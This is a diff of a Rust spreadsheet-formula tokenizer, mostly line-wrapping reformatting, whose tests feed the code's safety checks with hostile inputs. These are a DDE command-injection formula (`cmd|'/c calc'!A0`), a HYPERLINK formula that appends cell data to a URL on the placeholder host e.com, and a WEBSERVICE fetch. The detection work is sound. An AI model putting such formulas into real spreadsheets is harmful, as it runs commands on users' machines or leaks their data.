@@ -88,7 +88,9 @@ pub struct StructuredRef {
 
 impl StructuredRef {
     pub fn this_row(&self) -> bool {
-        self.items.iter().any(|i| i.eq_ignore_ascii_case("#This Row"))
+        self.items
+            .iter()
+            .any(|i| i.eq_ignore_ascii_case("#This Row"))
     }
 }
 
@@ -131,13 +133,17 @@ fn is_name_char(c: char) -> bool {
 /// Whether a sheet name must be quoted in a reference.
 pub fn sheet_needs_quotes(name: &str) -> bool {
     name.is_empty()
-        || !name.chars().all(|c| c.is_alphanumeric() || c == '_' || c == '.')
+        || !name
+            .chars()
+            .all(|c| c.is_alphanumeric() || c == '_' || c == '.')
         || name.chars().next().is_some_and(|c| c.is_ascii_digit())
         || looks_like_cell(name)
 }
 
 fn looks_like_cell(s: &str) -> bool {
-    let k = s.find(|c: char| !c.is_ascii_alphabetic()).unwrap_or(s.len());
+    let k = s
+        .find(|c: char| !c.is_ascii_alphabetic())
+        .unwrap_or(s.len());
     k > 0 && k <= 3 && k < s.len() && s[k..].bytes().all(|b| b.is_ascii_digit())
 }
 
@@ -158,9 +164,12 @@ pub fn tokenize(f: &str) -> Vec<Token> {
     while i < f.len() {
         let start = i;
         let c = f[i..].chars().next().unwrap();
-        let push = |out: &mut Vec<Token>, kind: Tok, end: usize| out.push(Token { kind, start, end });
+        let push =
+            |out: &mut Vec<Token>, kind: Tok, end: usize| out.push(Token { kind, start, end });
         if c.is_whitespace() {
-            let end = f[i..].find(|c: char| !c.is_whitespace()).map_or(f.len(), |k| i + k);
+            let end = f[i..]
+                .find(|c: char| !c.is_whitespace())
+                .map_or(f.len(), |k| i + k);
             push(&mut out, Tok::Space, end);
             i = end;
             continue;
@@ -185,9 +194,19 @@ pub fn tokenize(f: &str) -> Vec<Token> {
                 i = j;
             }
             '#' => {
-                let e = ERRORS.iter().find(|e| f[i..].to_ascii_uppercase().starts_with(*e));
+                let e = ERRORS
+                    .iter()
+                    .find(|e| f[i..].to_ascii_uppercase().starts_with(*e));
                 let end = e.map_or(i + 1, |e| i + e.len());
-                push(&mut out, if e.is_some() { Tok::Error } else { Tok::Unknown }, end);
+                push(
+                    &mut out,
+                    if e.is_some() {
+                        Tok::Error
+                    } else {
+                        Tok::Unknown
+                    },
+                    end,
+                );
                 i = end;
             }
             '(' => {
@@ -213,7 +232,11 @@ pub fn tokenize(f: &str) -> Vec<Token> {
                     push(&mut out, Tok::Ref(reference), e);
                     i = e;
                 } else {
-                    push(&mut out, Tok::Structured(parse_structured(None, &f[i..end])), end);
+                    push(
+                        &mut out,
+                        Tok::Structured(parse_structured(None, &f[i..end])),
+                        end,
+                    );
                     i = end;
                 }
             }
@@ -232,7 +255,12 @@ pub fn tokenize(f: &str) -> Vec<Token> {
             }
             '<' | '>' => {
                 let tail = &f[i..];
-                let n = if tail.starts_with("<=") || tail.starts_with(">=") || tail.starts_with("<>") { 2 } else { 1 };
+                let n =
+                    if tail.starts_with("<=") || tail.starts_with(">=") || tail.starts_with("<>") {
+                        2
+                    } else {
+                        1
+                    };
                 push(&mut out, Tok::Op(f[i..i + n].to_string()), i + n);
                 i += n;
             }
@@ -262,7 +290,9 @@ pub fn tokenize(f: &str) -> Vec<Token> {
                 i = end;
             }
             c if is_name_char(c) => {
-                let end = f[i..].find(|c: char| !is_name_char(c)).map_or(f.len(), |k| i + k);
+                let end = f[i..]
+                    .find(|c: char| !is_name_char(c))
+                    .map_or(f.len(), |k| i + k);
                 let word = &f[i..end];
                 let next = f[end..].chars().next();
                 // `Sheet1!A1`, `Sheet1:Sheet3!A1`
@@ -279,15 +309,20 @@ pub fn tokenize(f: &str) -> Vec<Token> {
                     if f[j..].starts_with('\'') {
                         j = quoted_sheet(f, j).map_or(f.len(), |(_, a)| a - 1);
                     }
-                    let e =
-                        f[j..].find(|c: char| c.is_whitespace() || matches!(c, ',' | ')')).map_or(f.len(), |k| j + k);
+                    let e = f[j..]
+                        .find(|c: char| c.is_whitespace() || matches!(c, ',' | ')'))
+                        .map_or(f.len(), |k| j + k);
                     push(&mut out, Tok::Dde, e);
                     i = e;
                     continue;
                 }
                 if next == Some('[') {
                     let e = bracket_end(f, end);
-                    push(&mut out, Tok::Structured(parse_structured(Some(word.to_string()), &f[end..e])), e);
+                    push(
+                        &mut out,
+                        Tok::Structured(parse_structured(Some(word.to_string()), &f[end..e])),
+                        e,
+                    );
                     i = e;
                     continue;
                 }
@@ -302,7 +337,11 @@ pub fn tokenize(f: &str) -> Vec<Token> {
                     continue;
                 }
                 let upper = word.to_ascii_uppercase();
-                let kind = if upper == "TRUE" || upper == "FALSE" { Tok::Bool } else { Tok::Name(word.to_string()) };
+                let kind = if upper == "TRUE" || upper == "FALSE" {
+                    Tok::Bool
+                } else {
+                    Tok::Name(word.to_string())
+                };
                 push(&mut out, kind, end);
                 i = end;
             }
@@ -406,14 +445,24 @@ fn quoted_sheet(f: &str, i: usize) -> Option<(SheetPrefix, usize)> {
 
 /// The end of an unquoted sheet word at `i` when `!` follows it.
 fn sheet_word_end(f: &str, i: usize) -> Option<usize> {
-    let e = f[i..].find(|c: char| !(is_name_char(c) || c == ':')).map_or(f.len(), |k| i + k);
+    let e = f[i..]
+        .find(|c: char| !(is_name_char(c) || c == ':'))
+        .map_or(f.len(), |k| i + k);
     (e > i && f[e..].starts_with('!')).then_some(e)
 }
 
 fn plain_sheet(s: &str) -> SheetPrefix {
     match s.split_once(':') {
-        Some((a, b)) => SheetPrefix { name: a.to_string(), to: Some(b.to_string()), external: false },
-        None => SheetPrefix { name: s.to_string(), to: None, external: false },
+        Some((a, b)) => SheetPrefix {
+            name: a.to_string(),
+            to: Some(b.to_string()),
+            external: false,
+        },
+        None => SheetPrefix {
+            name: s.to_string(),
+            to: None,
+            external: false,
+        },
     }
 }
 
@@ -430,7 +479,11 @@ fn corner(f: &str, i: usize) -> Option<(Corner, usize)> {
         j += 1;
     }
     let letters = &f[ls..j];
-    let col = if letters.is_empty() { None } else { Some(col_of(letters)?) };
+    let col = if letters.is_empty() {
+        None
+    } else {
+        Some(col_of(letters)?)
+    };
     let mut abs_row = false;
     let mut k = j;
     if b.get(k) == Some(&b'$') {
@@ -441,19 +494,41 @@ fn corner(f: &str, i: usize) -> Option<(Corner, usize)> {
     while k < b.len() && b[k].is_ascii_digit() {
         k += 1;
     }
-    let row = if k > ds { Some(f[ds..k].parse::<u32>().ok().filter(|r| *r >= 1 && *r <= 1_048_576)?) } else { None };
+    let row = if k > ds {
+        Some(
+            f[ds..k]
+                .parse::<u32>()
+                .ok()
+                .filter(|r| *r >= 1 && *r <= 1_048_576)?,
+        )
+    } else {
+        None
+    };
     if row.is_none() && abs_row {
         return None;
     }
     if col.is_none() && (abs_col && letters.is_empty() && row.is_none()) {
         return None;
     }
-    let c = Corner { col, row, abs_col: abs_col && col.is_some(), abs_row };
+    let c = Corner {
+        col,
+        row,
+        abs_col: abs_col && col.is_some(),
+        abs_row,
+    };
     if col.is_none() && row.is_none() {
         return None;
     }
     // `$3` is a row with an absolute marker on the row.
-    let c = if col.is_none() { Corner { abs_row: abs_col || abs_row, abs_col: false, ..c } } else { c };
+    let c = if col.is_none() {
+        Corner {
+            abs_row: abs_col || abs_row,
+            abs_col: false,
+            ..c
+        }
+    } else {
+        c
+    };
     Some((c, k))
 }
 
@@ -470,15 +545,32 @@ fn col_of(letters: &str) -> Option<u32> {
 /// continue a name.
 fn reference_after(f: &str, i: usize, sheet: Option<SheetPrefix>) -> Option<(Reference, usize)> {
     if sheet.is_some() && f[i..].starts_with("#REF!") {
-        return Some((Reference { sheet, first: None, last: None }, i + 5));
+        return Some((
+            Reference {
+                sheet,
+                first: None,
+                last: None,
+            },
+            i + 5,
+        ));
     }
     let (a, j) = corner(f, i)?;
-    let ends_ok = |k: usize| !f[k..].starts_with(|c: char| is_name_char(c) || c == '(' || c == '[' || c == '!');
+    let ends_ok = |k: usize| {
+        !f[k..].starts_with(|c: char| is_name_char(c) || c == '(' || c == '[' || c == '!')
+    };
     if f[j..].starts_with(':') {
         if let Some((b, k)) = corner(f, j + 1) {
-            let same_kind = (a.col.is_some() == b.col.is_some()) && (a.row.is_some() == b.row.is_some());
+            let same_kind =
+                (a.col.is_some() == b.col.is_some()) && (a.row.is_some() == b.row.is_some());
             if same_kind && ends_ok(k) {
-                return Some((Reference { sheet, first: Some(a), last: Some(b) }, k));
+                return Some((
+                    Reference {
+                        sheet,
+                        first: Some(a),
+                        last: Some(b),
+                    },
+                    k,
+                ));
             }
         }
     }
@@ -486,13 +578,26 @@ fn reference_after(f: &str, i: usize, sheet: Option<SheetPrefix>) -> Option<(Ref
     if a.col.is_none() || a.row.is_none() || !ends_ok(j) {
         return None;
     }
-    Some((Reference { sheet, first: Some(a), last: None }, j))
+    Some((
+        Reference {
+            sheet,
+            first: Some(a),
+            last: None,
+        },
+        j,
+    ))
 }
 
 /// Parse `[…]` (with its brackets) of a structured reference.
 fn parse_structured(table: Option<String>, s: &str) -> StructuredRef {
-    let mut r = StructuredRef { table, ..Default::default() };
-    let inner = s.strip_prefix('[').and_then(|x| x.strip_suffix(']')).unwrap_or(s);
+    let mut r = StructuredRef {
+        table,
+        ..Default::default()
+    };
+    let inner = s
+        .strip_prefix('[')
+        .and_then(|x| x.strip_suffix(']'))
+        .unwrap_or(s);
     let mut cols: Vec<String> = vec![];
     let push_item = |item: &str, r: &mut StructuredRef, cols: &mut Vec<String>| {
         let t = item.trim();
@@ -538,7 +643,9 @@ fn normal_item(t: &str) -> String {
 
 fn strip_brackets(s: &str) -> &str {
     let s = s.trim();
-    s.strip_prefix('[').and_then(|x| x.strip_suffix(']')).unwrap_or(s)
+    s.strip_prefix('[')
+        .and_then(|x| x.strip_suffix(']'))
+        .unwrap_or(s)
 }
 
 /// Split `[a],[b]:[c]` at top-level `,` and `:`.
@@ -592,7 +699,8 @@ pub fn escape_col(s: &str) -> String {
 
 /// Whether a column name needs its own brackets inside a reference (`[@[Col name]]`).
 fn needs_brackets(s: &str) -> bool {
-    s.chars().any(|c| c.is_whitespace() || "[]#',:@\"{}$^&*+=-<>/!%()~`;?\\|".contains(c))
+    s.chars()
+        .any(|c| c.is_whitespace() || "[]#',:@\"{}$^&*+=-<>/!%()~`;?\\|".contains(c))
 }
 
 impl fmt::Display for Corner {
@@ -647,7 +755,10 @@ pub fn prefix_text<'a>(formula: &'a str, t: &Token) -> &'a str {
 }
 
 /// Rewrite every reference token: `f` returns its replacement text, or `None` to keep it.
-pub fn rewrite_refs(formula: &str, f: &mut dyn FnMut(&Token, &Reference) -> Option<String>) -> String {
+pub fn rewrite_refs(
+    formula: &str,
+    f: &mut dyn FnMut(&Token, &Reference) -> Option<String>,
+) -> String {
     let mut out = String::with_capacity(formula.len());
     let mut at = 0;
     for t in tokenize(formula) {
@@ -664,7 +775,10 @@ pub fn rewrite_refs(formula: &str, f: &mut dyn FnMut(&Token, &Reference) -> Opti
 }
 
 /// Rewrite structured references (their table and column names).
-pub fn rewrite_structured(formula: &str, f: &mut dyn FnMut(&StructuredRef) -> Option<String>) -> String {
+pub fn rewrite_structured(
+    formula: &str,
+    f: &mut dyn FnMut(&StructuredRef) -> Option<String>,
+) -> String {
     let mut out = String::with_capacity(formula.len());
     let mut at = 0;
     for t in tokenize(formula) {
@@ -843,7 +957,11 @@ pub fn model_formula_problem(formula: &str) -> Option<FormulaProblem> {
     for t in &toks {
         match &t.kind {
             Tok::Ref(_) => return Some(FormulaProblem::A1(f[t.start..t.end].to_string())),
-            Tok::Unknown => return Some(FormulaProblem::Unreadable(f[t.start..].chars().take(12).collect())),
+            Tok::Unknown => {
+                return Some(FormulaProblem::Unreadable(
+                    f[t.start..].chars().take(12).collect(),
+                ))
+            }
             Tok::Open => depth += 1,
             Tok::Close => {
                 depth -= 1;
@@ -889,12 +1007,27 @@ mod tests {
 
     #[test]
     fn tokens() {
-        assert_eq!(kinds("=SUM(A1:B2)*2"), ["fn:SUM", "Open", "ref:A1:B2", "Close", "Op(\"*\")", "Num"]);
-        assert_eq!(kinds("매출!D2+'My Sheet'!$A$1"), ["ref:매출!D2", "Op(\"+\")", "ref:'My Sheet'!$A$1"]);
-        assert_eq!(kinds("SUM(A:A,3:5)"), ["fn:SUM", "Open", "ref:A:A", "Comma", "ref:3:5", "Close"]);
-        assert_eq!(kinds("LOG10(x1y)"), ["fn:LOG10", "Open", "name:x1y", "Close"]);
+        assert_eq!(
+            kinds("=SUM(A1:B2)*2"),
+            ["fn:SUM", "Open", "ref:A1:B2", "Close", "Op(\"*\")", "Num"]
+        );
+        assert_eq!(
+            kinds("매출!D2+'My Sheet'!$A$1"),
+            ["ref:매출!D2", "Op(\"+\")", "ref:'My Sheet'!$A$1"]
+        );
+        assert_eq!(
+            kinds("SUM(A:A,3:5)"),
+            ["fn:SUM", "Open", "ref:A:A", "Comma", "ref:3:5", "Close"]
+        );
+        assert_eq!(
+            kinds("LOG10(x1y)"),
+            ["fn:LOG10", "Open", "name:x1y", "Close"]
+        );
         assert_eq!(kinds("Sales[매출]"), ["st:Sales[매출]"]);
-        assert_eq!(kinds("[@[1인당 연봉]]*2"), ["st:[@[1인당 연봉]]", "Op(\"*\")", "Num"]);
+        assert_eq!(
+            kinds("[@[1인당 연봉]]*2"),
+            ["st:[@[1인당 연봉]]", "Op(\"*\")", "Num"]
+        );
         assert_eq!(kinds("\"a\"\"b\"&TRUE"), ["Str", "Op(\"&\")", "Bool"]);
         assert_eq!(kinds("cmd|'/c calc'!A0"), ["dde:cmd|'/c calc'!A0"]);
         assert_eq!(kinds("[1]Sheet1!A1"), ["ref:[1]Sheet1!A1"]);
@@ -909,10 +1042,14 @@ mod tests {
             for sheet in ["매출", "café", "销售"] {
                 let formula = format!("IF(A1{op}{sheet}!$A$1,1,0)");
                 let tokens = tokenize(&formula);
-                assert!(tokens.iter().all(|t| formula.is_char_boundary(t.start) && formula.is_char_boundary(t.end)));
+                assert!(tokens
+                    .iter()
+                    .all(|t| formula.is_char_boundary(t.start) && formula.is_char_boundary(t.end)));
                 assert!(tokens.iter().any(|t| t.kind == Tok::Op(op.into())));
                 assert_eq!(
-                    rewrite_refs(&formula, &mut |t, _| Some(formula[t.start..t.end].replace("A1", "A2"))),
+                    rewrite_refs(&formula, &mut |t, _| Some(
+                        formula[t.start..t.end].replace("A1", "A2")
+                    )),
                     format!("IF(A2{op}{sheet}!$A$1,1,0)")
                 );
             }
@@ -924,12 +1061,30 @@ mod tests {
     #[test]
     fn structured_forms() {
         let t = "Sales";
-        assert_eq!(to_file_form("=[@매출]-[@원가]", t), "=Sales[[#This Row],[매출]]-Sales[[#This Row],[원가]]");
-        assert_eq!(to_short_form("=Sales[[#This Row],[매출]]-Sales[[#This Row],[원가]]", t), "=[@매출]-[@원가]");
-        assert_eq!(to_file_form("=SUM([@[1분기]:[4분기]])", t), "=SUM(Sales[[#This Row],[1분기]:[4분기]])");
-        assert_eq!(to_short_form("=SUM(Sales[[#This Row],[1분기]:[4분기]])", t), "=SUM([@[1분기]:[4분기]])");
-        assert_eq!(to_file_form("=[@[1인당 연봉]]", t), "=Sales[[#This Row],[1인당 연봉]]");
-        assert_eq!(to_short_form("=Sales[[#This Row],[1인당 연봉]]", t), "=[@[1인당 연봉]]");
+        assert_eq!(
+            to_file_form("=[@매출]-[@원가]", t),
+            "=Sales[[#This Row],[매출]]-Sales[[#This Row],[원가]]"
+        );
+        assert_eq!(
+            to_short_form("=Sales[[#This Row],[매출]]-Sales[[#This Row],[원가]]", t),
+            "=[@매출]-[@원가]"
+        );
+        assert_eq!(
+            to_file_form("=SUM([@[1분기]:[4분기]])", t),
+            "=SUM(Sales[[#This Row],[1분기]:[4분기]])"
+        );
+        assert_eq!(
+            to_short_form("=SUM(Sales[[#This Row],[1분기]:[4분기]])", t),
+            "=SUM([@[1분기]:[4분기]])"
+        );
+        assert_eq!(
+            to_file_form("=[@[1인당 연봉]]", t),
+            "=Sales[[#This Row],[1인당 연봉]]"
+        );
+        assert_eq!(
+            to_short_form("=Sales[[#This Row],[1인당 연봉]]", t),
+            "=[@[1인당 연봉]]"
+        );
         assert_eq!(
             to_file_form("=SUMIFS(Sales[매출],Sales[월],[@월])", "R"),
             "=SUMIFS(Sales[매출],Sales[월],R[[#This Row],[월]])"
@@ -944,17 +1099,38 @@ mod tests {
     fn model_formulas() {
         assert_eq!(model_formula_problem("=[@매출]-[@원가]"), None);
         assert_eq!(model_formula_problem("=SUM(Sales[매출])"), None);
-        assert_eq!(model_formula_problem("=D2-E2"), Some(FormulaProblem::A1("D2".into())));
-        assert_eq!(model_formula_problem("=SUM(매출!D2:D9)"), Some(FormulaProblem::A1("매출!D2:D9".into())));
-        assert_eq!(model_formula_problem("[@a]"), Some(FormulaProblem::NotAFormula));
+        assert_eq!(
+            model_formula_problem("=D2-E2"),
+            Some(FormulaProblem::A1("D2".into()))
+        );
+        assert_eq!(
+            model_formula_problem("=SUM(매출!D2:D9)"),
+            Some(FormulaProblem::A1("매출!D2:D9".into()))
+        );
+        assert_eq!(
+            model_formula_problem("[@a]"),
+            Some(FormulaProblem::NotAFormula)
+        );
         assert_eq!(
             model_formula_problem("=WEBSERVICE(\"https://x\")"),
             Some(FormulaProblem::Fetch("WEBSERVICE".into()))
         );
-        assert_eq!(model_formula_problem("=HYPERLINK(\"https://e.com/?q=\"&[@a])"), Some(FormulaProblem::DataUrl));
-        assert_eq!(model_formula_problem("=HYPERLINK(\"https://e.com/a\",\"site\")"), None);
-        assert_eq!(model_formula_problem("=SUM([@a]"), Some(FormulaProblem::Unbalanced));
-        assert!(matches!(safety_problem("=cmd|'/c calc'!A0"), Some(FormulaProblem::Dde(_))));
+        assert_eq!(
+            model_formula_problem("=HYPERLINK(\"https://e.com/?q=\"&[@a])"),
+            Some(FormulaProblem::DataUrl)
+        );
+        assert_eq!(
+            model_formula_problem("=HYPERLINK(\"https://e.com/a\",\"site\")"),
+            None
+        );
+        assert_eq!(
+            model_formula_problem("=SUM([@a]"),
+            Some(FormulaProblem::Unbalanced)
+        );
+        assert!(matches!(
+            safety_problem("=cmd|'/c calc'!A0"),
+            Some(FormulaProblem::Dde(_))
+        ));
     }
 
     /// Every token of `f` starts and ends on a character boundary, the tokens
@@ -963,7 +1139,10 @@ mod tests {
         let tokens = tokenize(f);
         let mut at = if f.starts_with('=') { 1 } else { 0 };
         for t in &tokens {
-            assert!(f.is_char_boundary(t.start) && f.is_char_boundary(t.end), "{f:?}: {t:?}");
+            assert!(
+                f.is_char_boundary(t.start) && f.is_char_boundary(t.end),
+                "{f:?}: {t:?}"
+            );
             assert!(t.start == at && t.start < t.end, "{f:?}: {t:?}");
             at = t.end;
         }
@@ -972,12 +1151,26 @@ mod tests {
 
     #[test]
     fn unclosed_brackets() {
-        for f in ["[", "=[", "=[가", "=SUM([", "=[ab", "=[1]Sheet1!A1", "=T[", "=T[가", "=[[]", "=[']"] {
+        for f in [
+            "[",
+            "=[",
+            "=[가",
+            "=SUM([",
+            "=[ab",
+            "=[1]Sheet1!A1",
+            "=T[",
+            "=T[가",
+            "=[[]",
+            "=[']",
+        ] {
             assert_token_spans(f);
         }
         assert_eq!(kinds("=[가"), ["st:[가"]);
         assert_eq!(kinds("=SUM(["), ["fn:SUM", "Open", "st:["]);
-        assert_eq!(structured_refs("=[ab")[0].columns, Some(("[ab".into(), "[ab".into())));
+        assert_eq!(
+            structured_refs("=[ab")[0].columns,
+            Some(("[ab".into(), "[ab".into()))
+        );
         assert_eq!(kinds("=[1]Sheet1!A1"), ["ref:[1]Sheet1!A1"]);
         let _ = model_formula_problem("=[");
         let _ = model_formula_problem("=[가");
@@ -989,8 +1182,10 @@ mod tests {
     /// the tokenizer treats specially: no panic, and token spans on character boundaries.
     #[test]
     fn short_formulas_never_panic() {
-        const ALPHABET: [char; 18] =
-            ['[', ']', '\'', '"', '=', '!', '가', '1', 'A', ':', '@', '#', '(', ')', ',', '$', ' ', '|'];
+        const ALPHABET: [char; 18] = [
+            '[', ']', '\'', '"', '=', '!', '가', '1', 'A', ':', '@', '#', '(', ')', ',', '$', ' ',
+            '|',
+        ];
         let mut f = String::new();
         let mut idx: Vec<usize> = vec![];
         loop {
